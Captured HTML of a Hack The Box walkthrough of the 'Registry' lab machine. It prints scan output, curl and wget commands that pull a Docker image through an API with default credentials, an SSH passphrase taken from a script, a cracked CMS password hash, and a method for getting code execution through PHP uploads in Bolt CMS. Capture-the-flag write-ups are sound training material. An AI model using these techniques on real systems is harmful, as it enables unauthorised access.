@@ -1,0 +1,566 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <title>Registry [Hard] - Windows :: 5ysk3y Pwnz — An online resource for Hack the Box stuff</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+<meta name="description" content="Registry is an amazing Linux machine - it&amp;rsquo;s rated as hard but I didn&amp;rsquo;t find it all too difficult. That said it was very enjoyable and involves you, firstly, taking advantage of a Docker API to pull down an image from a Registry on the box. From there we get a shell and proceed to gain access to a hosted CMS called Bolt; this enables us to execute code as the www-data user which, conveniently, also has sudo access to a binary that can perform full system backups." />
+<meta name="keywords" content="HTB, Hack the Box" />
+<meta name="robots" content="noodp" />
+<link rel="canonical" href="https://5ysk3y.github.io/htb/guides/registry/" />
+
+
+
+
+<link rel="stylesheet" href="https://5ysk3y.github.io/assets/style.css">
+
+  <link rel="stylesheet" href="https://5ysk3y.github.io/assets/blue.css">
+
+
+
+
+
+
+<link rel="apple-touch-icon-precomposed" sizes="144x144" href="https://5ysk3y.github.io/img/apple-touch-icon-144-precomposed.png">
+
+  <link rel="shortcut icon" href="https://5ysk3y.github.io/img/favicon/blue.png">
+
+
+
+<meta name="twitter:card" content="summary" />
+
+  <meta name="twitter:site" content="" />
+
+<meta name="twitter:creator" content="" />
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="Registry [Hard] - Windows :: 5ysk3y Pwnz">
+<meta property="og:description" content="Registry is an amazing Linux machine - it&amp;rsquo;s rated as hard but I didn&amp;rsquo;t find it all too difficult. That said it was very enjoyable and involves you, firstly, taking advantage of a Docker API to pull down an image from a Registry on the box. From there we get a shell and proceed to gain access to a hosted CMS called Bolt; this enables us to execute code as the www-data user which, conveniently, also has sudo access to a binary that can perform full system backups." />
+<meta property="og:url" content="https://5ysk3y.github.io/htb/guides/registry/" />
+<meta property="og:site_name" content="Registry [Hard] - Windows" />
+<meta property="og:image" content="https://5ysk3y.github.io/">
+<meta property="og:image:width" content="2048">
+<meta property="og:image:height" content="1024">
+
+
+  <meta property="article:published_time" content="2020-04-01 16:21:41 &#43;0000 UTC" />
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body class="">
+
+
+<div class="container headings--one-size">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/">
+  <div class="logo">
+    5ysk3y pwnZ
+  </div>
+</a>
+
+    </div>
+    <div class="menu-trigger">menu</div>
+  </div>
+  
+    <nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    
+      
+        
+          <li><a href="/">Home</a></li>
+        
+      
+        
+          <li><a href="/htb">HTB</a></li>
+        
+      
+      
+        <ul class="menu__sub-inner">
+          <li class="menu__sub-inner-more-trigger">Show more ▾</li>
+
+          <ul class="menu__sub-inner-more hidden">
+            
+              
+                <li><a href="https://gist.github.com/5ysk3y">Gists</a></li>
+              
+            
+          </ul>
+        </ul>
+      
+    
+
+    
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        <li><a href="/">Home</a></li>
+      
+    
+      
+        <li><a href="/htb">HTB</a></li>
+      
+    
+      
+        <li><a href="https://gist.github.com/5ysk3y">Gists</a></li>
+      
+    
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+<div class="post">
+  <h1 class="post-title">
+    <a href="https://5ysk3y.github.io/htb/guides/registry/">Registry [Hard] - Windows</a></h1>
+  <div class="post-meta">
+      
+    <span class="post-date">
+      2020-04-01
+    </span>
+    
+    
+  </div>
+
+  
+  <span class="post-tags">
+    
+    #<a href="https://5ysk3y.github.io/tags/hack-the-box/">Hack The Box</a>&nbsp;
+    
+    #<a href="https://5ysk3y.github.io/tags/linux/">Linux</a>&nbsp;
+    
+    #<a href="https://5ysk3y.github.io/tags/hard/">Hard</a>&nbsp;
+    
+    #<a href="https://5ysk3y.github.io/tags/restic/">Restic</a>&nbsp;
+    
+    #<a href="https://5ysk3y.github.io/tags/docker-registry/">Docker Registry</a>&nbsp;
+    
+    #<a href="https://5ysk3y.github.io/tags/bolt-cms-exploit/">Bolt CMS Exploit</a>&nbsp;
+    
+  </span>
+  
+
+  
+
+  <div class="post-content"><div>
+        <p>Registry is an amazing Linux machine - it&rsquo;s rated as hard but I didn&rsquo;t find it all too difficult. That said it was very enjoyable and involves you, firstly, taking advantage of a Docker API to pull down an image from a Registry on the box. From there we get a shell and proceed to gain access to a hosted CMS called Bolt; this enables us to execute code as the www-data user which, conveniently, also has sudo access to a binary that can perform full system backups. Leveraging that, we&rsquo;re able to backup the root folder giving us access to the final flag and some SSH keys for good measure.</p>
+<hr>
+<p>As standard we will begin with our nmap scan:</p>
+<pre><code>skynet Boxes/ForwardSlash » cat ../Registry/nmap/registry_initial.nmap
+# Nmap 7.80 scan initiated Sun Oct 20 15:33:23 2019 as: nmap -A -oA nmap/registry_initial -vvv 10.10.10.159
+Nmap scan report for 10.10.10.159
+Host is up, received echo-reply ttl 63 (0.020s latency).
+Scanned at 2019-10-20 15:33:23 BST for 27s
+Not shown: 997 closed ports
+Reason: 997 resets
+PORT    STATE SERVICE  REASON         VERSION
+22/tcp  open  ssh      syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   2048 72:d4:8d:da:ff:9b:94:2a:ee:55:0c:04:30:71:88:93 (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDCZtxPox0F/6ZQbPbgwP9t13ZX+DegufV+sVoqTGWfuE2/jQwVLR+TCLJM4EDg4UJol4OHl0ATQBkPM7CSi1DS3oZgNlaASXQoZFzHUN4KF1/B6uShfMcszORHOBSRZAMe5nuesre2oJtrqhyO1VS2TMOitFLmKEaDImHy7EXe8qnaK8CrVFAxdUOG8iQFEiZUt8JZJ6CPgfIu00t4JpIl9l4aOFEZT6H7xf7K74ov2KNyP6WCoOtdDf7Rhfwcfo6dogHxssH6O/d+FgN6KJ8q2gJjUZVYYjZHTfGCPRukmSDYQNglQkvzuOy3umUTwNt5NdjYBT+vemcOIaDPm0SX
+|   256 c7:40:d0:0e:e4:97:4a:4f:f9:fb:b2:0b:33:99:48:6d (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDFZI3tSfqp1WJF1TjoPa3J6j94yzXZMtFj92P8HcBUXCosmhsTsRa5rBvt20Es/qTp2otqYz3R3jf9O0OGC/tc=
+|   256 78:34:80:14:a1:3d:56:12:b4:0a:98:1f:e6:b4:e8:93 (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINNAMP4YFJGAx3ip1MPEsDuXUhgHXOIxrVTUCOxqJeRr
+80/tcp  open  http     syn-ack ttl 63 nginx 1.14.0 (Ubuntu)
+| http-methods:
+|_  Supported Methods: GET HEAD
+|_http-server-header: nginx/1.14.0 (Ubuntu)
+|_http-title: Welcome to nginx!
+443/tcp open  ssl/http syn-ack ttl 63 nginx 1.14.0 (Ubuntu)
+| http-methods:
+|_  Supported Methods: GET HEAD
+|_http-server-header: nginx/1.14.0 (Ubuntu)
+|_http-title: Welcome to nginx!
+| ssl-cert: Subject: commonName=docker.registry.htb
+| Issuer: commonName=Registry
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2019-05-06T21:14:35
+| Not valid after:  2029-05-03T21:14:35
+| MD5:   0d6f 504f 1cb5 de50 2f4e 5f67 9db6 a3a9
+| SHA-1: 7da0 1245 1d62 d69b a87e 8667 083c 39a6 9eb2 b2b5
+| -----BEGIN CERTIFICATE-----
+| MIICrTCCAZUCCQDjC7Es6pyC3TANBgkqhkiG9w0BAQsFADATMREwDwYDVQQDDAhS
+| ZWdpc3RyeTAeFw0xOTA1MDYyMTE0MzVaFw0yOTA1MDMyMTE0MzVaMB4xHDAaBgNV
+| BAMME2RvY2tlci5yZWdpc3RyeS5odGIwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAw
+| ggEKAoIBAQDAQd6mLhCheVIu0IOf2QIXH4UZGnzIrcQgDfTelpc3E4QxH0nq+KPg
+| 7gsPuMz/WMnmZUh3dLKLXb7hqJ2Wk8vQM6tt+PbKna/D6WKXqGM3JnSLKW1YOkIu
+| AuQenMOxJxh41IA0+3FqdlEdtaOV8sP+bgFB/uG2NDfPOLciJMop+d5pwpcxro8l
+| egZASYNM3AbZjWAotmMqHwjGwZwqqxXxn61DixNDN2GWLQHO7QPUVUjF+Npso3zN
+| ZLUJ1vkAtl6kFlmLTJgjlTUuE78udKD5r/NLqHNxxxObaSFXrmm2maDDoAkhobOt
+| ljpa/U/fCv8g03KToaXVZYb6BfFEP5FBAgMBAAEwDQYJKoZIhvcNAQELBQADggEB
+| AF3zSdj6GB3UYb431GRyTe32Th3QgpbXsQXA2qaLjI0n3qOF5PYnADgKsDzTxtDU
+| z4e5vLz0Y3NhMKobft+vzBt2GbJIzo8DbmDBD3z1WQU+GLTnXyUAPF9J6fhtUgKm
+| hoq1S8YsKRt/NMJwZMk3GiIw1c7KEN3/9XqJ9lfIyeXqVc6XBvuiZ+ssjDId0RZO
+| 7eWWELxItMHPVScwWpOA7B4INPM6USKGy7hUTFcPJZB7+ElTFO2h0c4MwFQcSqKW
+| BUG+oUPpMOoO99ZRnX8D5/H3dvbuBsuqKgRrPmQnMehoWs7pNRUDudUnnLfGEJHh
+| PEyspHOCbg1C6a0gI1xo0c0=
+|_-----END CERTIFICATE-----
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.80%E=4%D=10/20%OT=22%CT=1%CU=40128%PV=Y%DS=2%DC=T%G=Y%TM=5DAC70
+OS:4E%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=10C%TI=Z%CI=I%II=I%TS=A)OP
+OS:S(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST
+OS:11NW7%O6=M54DST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)EC
+OS:N(R=Y%DF=Y%T=40%W=7210%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=
+OS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(
+OS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%
+OS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N
+OS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C
+OS:D=S)
+
+Uptime guess: 33.561 days (since Tue Sep 17 02:05:49 2019)
+Network Distance: 2 hops
+TCP Sequence Prediction: Difficulty=262 (Good luck!)
+IP ID Sequence Generation: All zeros
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using port 53/tcp)
+HOP RTT      ADDRESS
+1   27.26 ms 10.10.14.1
+2   27.27 ms 10.10.10.159
+
+Read data files from: /usr/bin/../share/nmap
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Sun Oct 20 15:33:50 2019 -- 1 IP address (1 host up) scanned in 27.77 seconds
+skynet Boxes/ForwardSlash » cd ../Registry
+skynet Boxes/Registry » cat nmap/registry_initial.nmap
+# Nmap 7.80 scan initiated Sun Oct 20 15:33:23 2019 as: nmap -A -oA nmap/registry_initial -vvv 10.10.10.159
+Nmap scan report for 10.10.10.159
+Host is up, received echo-reply ttl 63 (0.020s latency).
+Scanned at 2019-10-20 15:33:23 BST for 27s
+Not shown: 997 closed ports
+Reason: 997 resets
+PORT    STATE SERVICE  REASON         VERSION
+22/tcp  open  ssh      syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   2048 72:d4:8d:da:ff:9b:94:2a:ee:55:0c:04:30:71:88:93 (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDCZtxPox0F/6ZQbPbgwP9t13ZX+DegufV+sVoqTGWfuE2/jQwVLR+TCLJM4EDg4UJol4OHl0ATQBkPM7CSi1DS3oZgNlaASXQoZFzHUN4KF1/B6uShfMcszORHOBSRZAMe5nuesre2oJtrqhyO1VS2TMOitFLmKEaDImHy7EXe8qnaK8CrVFAxdUOG8iQFEiZUt8JZJ6CPgfIu00t4JpIl9l4aOFEZT6H7xf7K74ov2KNyP6WCoOtdDf7Rhfwcfo6dogHxssH6O/d+FgN6KJ8q2gJjUZVYYjZHTfGCPRukmSDYQNglQkvzuOy3umUTwNt5NdjYBT+vemcOIaDPm0SX
+|   256 c7:40:d0:0e:e4:97:4a:4f:f9:fb:b2:0b:33:99:48:6d (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDFZI3tSfqp1WJF1TjoPa3J6j94yzXZMtFj92P8HcBUXCosmhsTsRa5rBvt20Es/qTp2otqYz3R3jf9O0OGC/tc=
+|   256 78:34:80:14:a1:3d:56:12:b4:0a:98:1f:e6:b4:e8:93 (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINNAMP4YFJGAx3ip1MPEsDuXUhgHXOIxrVTUCOxqJeRr
+80/tcp  open  http     syn-ack ttl 63 nginx 1.14.0 (Ubuntu)
+| http-methods:
+|_  Supported Methods: GET HEAD
+|_http-server-header: nginx/1.14.0 (Ubuntu)
+|_http-title: Welcome to nginx!
+443/tcp open  ssl/http syn-ack ttl 63 nginx 1.14.0 (Ubuntu)
+| http-methods:
+|_  Supported Methods: GET HEAD
+|_http-server-header: nginx/1.14.0 (Ubuntu)
+|_http-title: Welcome to nginx!
+| ssl-cert: Subject: commonName=docker.registry.htb
+| Issuer: commonName=Registry
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2019-05-06T21:14:35
+| Not valid after:  2029-05-03T21:14:35
+| MD5:   0d6f 504f 1cb5 de50 2f4e 5f67 9db6 a3a9
+| SHA-1: 7da0 1245 1d62 d69b a87e 8667 083c 39a6 9eb2 b2b5
+| -----BEGIN CERTIFICATE-----
+| MIICrTCCAZUCCQDjC7Es6pyC3TANBgkqhkiG9w0BAQsFADATMREwDwYDVQQDDAhS
+| ZWdpc3RyeTAeFw0xOTA1MDYyMTE0MzVaFw0yOTA1MDMyMTE0MzVaMB4xHDAaBgNV
+| BAMME2RvY2tlci5yZWdpc3RyeS5odGIwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAw
+| ggEKAoIBAQDAQd6mLhCheVIu0IOf2QIXH4UZGnzIrcQgDfTelpc3E4QxH0nq+KPg
+| 7gsPuMz/WMnmZUh3dLKLXb7hqJ2Wk8vQM6tt+PbKna/D6WKXqGM3JnSLKW1YOkIu
+| AuQenMOxJxh41IA0+3FqdlEdtaOV8sP+bgFB/uG2NDfPOLciJMop+d5pwpcxro8l
+| egZASYNM3AbZjWAotmMqHwjGwZwqqxXxn61DixNDN2GWLQHO7QPUVUjF+Npso3zN
+| ZLUJ1vkAtl6kFlmLTJgjlTUuE78udKD5r/NLqHNxxxObaSFXrmm2maDDoAkhobOt
+| ljpa/U/fCv8g03KToaXVZYb6BfFEP5FBAgMBAAEwDQYJKoZIhvcNAQELBQADggEB
+| AF3zSdj6GB3UYb431GRyTe32Th3QgpbXsQXA2qaLjI0n3qOF5PYnADgKsDzTxtDU
+| z4e5vLz0Y3NhMKobft+vzBt2GbJIzo8DbmDBD3z1WQU+GLTnXyUAPF9J6fhtUgKm
+| hoq1S8YsKRt/NMJwZMk3GiIw1c7KEN3/9XqJ9lfIyeXqVc6XBvuiZ+ssjDId0RZO
+| 7eWWELxItMHPVScwWpOA7B4INPM6USKGy7hUTFcPJZB7+ElTFO2h0c4MwFQcSqKW
+| BUG+oUPpMOoO99ZRnX8D5/H3dvbuBsuqKgRrPmQnMehoWs7pNRUDudUnnLfGEJHh
+| PEyspHOCbg1C6a0gI1xo0c0=
+|_-----END CERTIFICATE-----
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.80%E=4%D=10/20%OT=22%CT=1%CU=40128%PV=Y%DS=2%DC=T%G=Y%TM=5DAC70
+OS:4E%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=10C%TI=Z%CI=I%II=I%TS=A)OP
+OS:S(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST
+OS:11NW7%O6=M54DST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)EC
+OS:N(R=Y%DF=Y%T=40%W=7210%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=
+OS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(
+OS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%
+OS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N
+OS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C
+OS:D=S)
+
+Uptime guess: 33.561 days (since Tue Sep 17 02:05:49 2019)
+Network Distance: 2 hops
+TCP Sequence Prediction: Difficulty=262 (Good luck!)
+IP ID Sequence Generation: All zeros
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using port 53/tcp)
+HOP RTT      ADDRESS
+1   27.26 ms 10.10.14.1
+2   27.27 ms 10.10.10.159
+
+Read data files from: /usr/bin/../share/nmap
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Sun Oct 20 15:33:50 2019 -- 1 IP address (1 host up) scanned in 27.77 seconds
+</code></pre><p>There&rsquo;s not much exposed here, namely the web ports - 80/443 are open. Both, by default, load a standard nginx 1.14.0 page. Trusty Ubuntu, I think. There appear to be no differences in version so its not, say, 2 separate instances running on a single machine. Before we start poking around I&rsquo;ll set off a gobuster directory scan - that said, manual poking didn&rsquo;t seem to give me much (i.e. robots.txt etc). Thankfully gobuster came back with some results for us to check out:</p>
+<pre><code>skynet Boxes/Registry » cat dirb/registry_initial
+/index.html (Status: 200)
+/install (Status: 301)
+/backup.php (Status: 200)
+/bolt (Status: 301)
+</code></pre><p>Backup.php loads into a blank page, with no underlying source exposed, so we won&rsquo;t be able to do much with that unless we find a way to read it.</p>
+<p>Loading the <code>/bolt</code> URI presents us with a templated webpage - I use the Wappalyzer extension in Firefox and that identifies this as Bolt CMS. After locating this on <a href="https://github.com/bolt/bolt" target="_blank">Github</a>
+ I found there was a changelog.md file - loading that via the box shows that this is:</p>
+<blockquote>
+<p>Bolt 3.6.4</p>
+</blockquote>
+<p>The latest version (at the time of these notes) is 3.6.10. Looking at common exploits for the version being used, the following matches this criteria:</p>
+<p><code>Bolt CMS 3.6.4 - Cross-Site Scripting</code></p>
+<p>That said, this appears to require authorization that we don&rsquo;t have yet and there may be other channels to take here, so let&rsquo;s look elsewhere first.</p>
+<p>The nmap scan shows port 443 as having an SSL with the common name of docker.registry.htb. Adding that to our hosts file and running gobuster scan against it gets us a directory called <code>v2</code>:</p>
+<pre><code>skynet Boxes/Registry » cat dirb/registry_registry.dirb
+/v2 (Status: 401)
+</code></pre><p>This is protected by basic auth but I managed to bypass it with manual fuzzing - “admin:admin” are the correct creds, and this gives us access to a blank JSON interface. Looking at the headers of the page I can see this:</p>
+<p><code>Docker-Distribution-Api-Version: registry/2.0</code></p>
+<p>Which suggests that this API endpoint is interfacing with Docker Registry - this is a docker tool that allows you to store docker images in a repository, which is part of a Docker Registry. In order to move forward we&rsquo;re going to have to try and enumerate whether we have any data available to us through this endpoint. This page appears to be particularly useful in assisting us with that goal:</p>
+<p><a href="https://docs.docker.com/registry/spec/api/#listing-repositories" target="_blank">Docker Registry - Listing Repositories</a>
+</p>
+<p>That entire page is actually very useful but the anchor point in the URL above describes how to list available “repositories” - Following the guidance and visiting <code>/v2/_catalog</code> shows us:</p>
+<pre><code>~/HTB/Boxes/Registry curl http://docker.registry.htb/v2/_catalog -H &quot;Authorization: Basic YWRtaW46YWRtaW4=&quot;
+{&quot;repositories&quot;:[&quot;bolt-image&quot;]}
+</code></pre><p>A single repo exists, as you can see, with the name: <code>bolt-image</code></p>
+<p>Now to see if we can pull this image. According to this:</p>
+<p><a href="https://docs.docker.com/registry/spec/api/#pulling-an-image">https://docs.docker.com/registry/spec/api/#pulling-an-image</a></p>
+<p>Pulling an image requires you to get two things: the image manifest and something called associated layer files. Layer files are a bit like chunked archives; you have a numer of them that contain different parts of a wider data set. Once you have them all, you typically have what resembles an entire image. First off, to get the manifest, you visit:</p>
+<p><code>http://docker.registry.htb/v2/&lt;name&gt;/manifests/&lt;reference&gt;</code></p>
+<p>We have the <code>&lt;name&gt;</code> (bolt-image) but the reference we needed was obtained using this:</p>
+<pre><code> ~/HTB/Boxes/Registry curl http://docker.registry.htb/v2/bolt-image/tags/list -H &quot;Authorization: Basic YWRtaW46YWRtaW4=&quot;
+{&quot;name&quot;:&quot;bolt-image&quot;,&quot;tags&quot;:[&quot;latest&quot;]}
+</code></pre><p>The reference was the tag shown: <code>latest</code>.</p>
+<p>That then translates to the following URL:</p>
+<blockquote>
+<p><a href="http://docker.registry.htb/v2/bolt-image/manifests/latest">http://docker.registry.htb/v2/bolt-image/manifests/latest</a></p>
+</blockquote>
+<p>Visiting or CURL&rsquo;ing this outputs a tonne of data; one part of that data is a set of blobsums. These are the &ldquo;layers&rdquo; dockers documentation was referering to, earlier.</p>
+<p>To get individual layers, we can pull the blobsum list from this manifest:</p>
+<pre><code> ~/HTB/Boxes/Registry curl -s http://docker.registry.htb/v2/bolt-image/manifests/latest -X GET -H &quot;Authorization: Basic YWRtaW46YWRtaW4=&quot; | grep blobSum
+&quot;blobSum&quot;: &quot;sha256:302bfcb3f10c386a25a58913917257bd2fe772127e36645192fa35e4c6b3c66b&quot;
+&quot;blobSum&quot;: &quot;sha256:3f12770883a63c833eab7652242d55a95aea6e2ecd09e21c29d7d7b354f3d4ee&quot;
+&quot;blobSum&quot;: &quot;sha256:02666a14e1b55276ecb9812747cb1a95b78056f1d202b087d71096ca0b58c98c&quot;
+&quot;blobSum&quot;: &quot;sha256:c71b0b975ab8204bb66f2b659fa3d568f2d164a620159fc9f9f185d958c352a7&quot;
+&quot;blobSum&quot;: &quot;sha256:2931a8b44e495489fdbe2bccd7232e99b182034206067a364553841a1f06f791&quot;
+&quot;blobSum&quot;: &quot;sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4&quot;
+&quot;blobSum&quot;: &quot;sha256:f5029279ec1223b70f2cbb2682ab360e1837a2ea59a8d7ff64b38e9eab5fb8c0&quot;
+&quot;blobSum&quot;: &quot;sha256:d9af21273955749bb8250c7a883fcce21647b54f5a685d237bc6b920a2ebad1a&quot;
+&quot;blobSum&quot;: &quot;sha256:8882c27f669ef315fc231f272965cd5ee8507c0f376855d6f9c012aae0224797&quot;
+&quot;blobSum&quot;: &quot;sha256:f476d66f540886e2bb4d9c8cc8c0f8915bca7d387e536957796ea6c2f8e7dfff&quot;
+</code></pre><p>Taking the first of these blobsums and hitting the following URL with that:</p>
+<p><a href="http://docker.registry.htb/v2/bolt-image/blobs/sha256:302bfcb3f10c386a25a58913917257bd2fe772127e36645192fa35e4c6b3c66b">http://docker.registry.htb/v2/bolt-image/blobs/sha256:302bfcb3f10c386a25a58913917257bd2fe772127e36645192fa35e4c6b3c66b</a></p>
+<p>Gets us a binary file that (after following) turned out to be a tar.gz file containing a single script detailing some docker ssh info.. so, partial data.</p>
+<p>Now it would appear that, to be thorough, im going to need to download all of these blobs. So I used the above command with awk to grab the sha256:<!-- raw HTML omitted --> poritions of that and then ran it through a loop with wget:</p>
+<p><code>for i in $(cat blobs); do wget --user admin --password admin http://docker.registry.htb/v2/bolt-image/blobs/$i -O $i.tar.gz; done</code></p>
+<p>Most of these are bytes in size, but two of them are larger: blob starting 2931 = 100mb and blob starting f476 = 36mb.</p>
+<p>Going through them to see whether, once all data is extracted, theres anything useful to find and we can confirm that there is. With all blobs downloaded we can now extract all the data to get a full image.</p>
+<blockquote>
+<p>N.B: I installed rename and ran the following command to easily rename all files for mass extraction (the colon after &ldquo;sha256&rdquo; in the filename was causing issues):</p>
+</blockquote>
+<p><code> ~/HTB/Boxes/Registry rename 's/sha256://' *</code></p>
+<p>Inspecting the extracted data suggests it is a full docker container image we&rsquo;ve downloaded, as it contains most of the standard Linux file structure. In this case the useful folder was /root/.ssh - this contains a config file and a SSH key pair. The config file is as follows:</p>
+<pre><code>skynet root/.ssh » cat config
+Host registry
+  User bolt
+  Port 22
+  Hostname registry.htb
+</code></pre><p>This confirms the user (bolt) but we need a passphrase for the SSH key we have because connecting without one fails. I think I got slightly lucky here poking around the docker image we have because I found the following file:</p>
+<p><code>./etc/profile.d/02-ssh.sh</code></p>
+<p>Containing this:</p>
+<pre><code>skynet Registry/docker » cat ./etc/profile.d/02-ssh.sh
+#!/usr/bin/expect -f
+#eval `ssh-agent -s`
+spawn ssh-add /root/.ssh/id_rsa
+expect &quot;Enter passphrase for /root/.ssh/id_rsa:&quot;
+send &quot;GkOcz221Ftb3ugog\n&quot;;
+expect &quot;Identity added: /root/.ssh/id_rsa (/root/.ssh/id_rsa)&quot;
+interact
+</code></pre><p>This shows a script that uses <code>expect</code> to execute a command to add the SSH key we found to the system keychain - and in doing so, it exposes a password! I got a shell by using the user defined in the config file (bolt) and the id_rsa file we have. When it comes to the passphrase, the <code>\n</code> at the end of the string is a literal new line, so it needs to be removed. Our full passphrase is <code>GkOcz221Ftb3ugog</code></p>
+<p>Upon logging in we get the user flag! Epic. We also have a direct login to the bolt user.</p>
+<pre><code>bolt@bolt:~$ wc -c user.txt
+33 user.txt
+</code></pre><hr>
+<p>Now we have a shell on the box, we can run an enumeration script to get a handle on things. There was nothing in the Bolt home folder that peaked my interest so I decided to run LinEnum which exposes a few interesting things. If we recall, earlier on, we stumbled across a CMS named Bolt that had an authenticated CVE - LinEmum gives us a way to potentially get around this by highlighting the <code>bolt.db</code> file that the CMS is using to store data:</p>
+<pre><code>/var/www/html/bolt/tests/phpunit/unit/resources/db:
+total 92K
+drwxrwxr-x 2 www-data www-data 4.0K Oct  8 21:16 .
+drwxrwxr-x 4 www-data www-data 4.0K Oct  8 21:16 ..
+-rw-rw-r-- 1 www-data www-data  84K Oct  8 21:16 bolt.db
+</code></pre><p>And its SQLite3 format:</p>
+<pre><code>bolt@bolt:/var/www/html/bolt$ file /var/www/html/bolt/tests/phpunit/unit/resources/db/bolt.db
+/var/www/html/bolt/tests/phpunit/unit/resources/db/bolt.db: SQLite 3.x database, last written using SQLite version 3020001
+</code></pre><p>The HTB machine didnt have SQLite available so I downloaded this locally and queried the most interesting table (the users table!) - I&rsquo;ve had SQL give me the important info here but you can poke around the other tables if you wish to:</p>
+<pre><code>sqlite&gt; select password from bolt_users where id=1;
+password
+------------------------------------------------------------
+$2y$10$e.ChUytg9SrL7AsboF2bX.wWKQ1LkS5Fi3/Z0yYD86.P5E9cpY7PK
+</code></pre><blockquote>
+<p>N.B - the associated user for this password was <code>admin</code></p>
+</blockquote>
+<p>Running this through Hashcat gets us a password:</p>
+<p><code>$2y$10$e.ChUytg9SrL7AsboF2bX.wWKQ1LkS5Fi3/Z0yYD86.P5E9cpY7PK : strawberry</code></p>
+<p>I&rsquo;ll also note another file I spotted through LinEnum located here:</p>
+<p><code>/var/www/html/backup.php</code></p>
+<p>The contents of this are actually fairly interesting:</p>
+<pre><code>bolt@bolt:/var/www/html$ cat backup.php
+&lt;?php shell_exec(&quot;sudo restic backup -r rest:http://backup.registry.htb/bolt bolt&quot;);
+</code></pre><p>The file is owned by root but it also, very likely, exists for a reason. In knowledge of this we can now go back to the Bolt CMS with a view to pulling this all together.
+Poking around on the <a href="https://docs.bolt.cm/3.7/manual/login" target="_blank">Bolt CMS Knowledge Base</a>
+ you can see that their default admin URI is <code>/bolt</code> - given that the CMS is installed into a directory of the same name, the full admin URL will be:</p>
+<p><code>http://10.10.10.159/bolt/bolt</code></p>
+<p>As we are unable to really do much with our Bolt user, the next step (given the path we&rsquo;re taking) is to try and gain access to the underlying web user - we know that Bolt is susceptible to being exploited, and we&rsquo;re now able to login. If we look around the CMS, we&rsquo;ll quickly find out we have access to the bolt <code>config.yml</code> file via the web interface - Configuration -&gt; Main Configuration - browsing the contents will quickly help you realise that you&rsquo;re unable to upload PHP files by default. You are, if you try it, able to override this by adding the PHP extension to the list of <code>accept_file_types: </code> that are defined. All uploaded files go into the URI <code>/bolt/files/</code> so its now possible to get code execution, without the need for a pre-written CVE.</p>
